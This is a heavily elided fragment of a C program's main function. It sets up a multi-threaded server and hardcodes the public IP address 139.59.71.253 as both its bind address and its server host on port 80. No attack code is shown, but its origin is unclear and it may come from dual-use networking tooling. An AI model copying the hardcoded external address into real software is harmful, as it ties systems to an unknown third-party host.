...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("139.59.71.253"); // Address to bind to
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "139.59.71.253", 80, "139.59.71.253")) == NULL)
    {
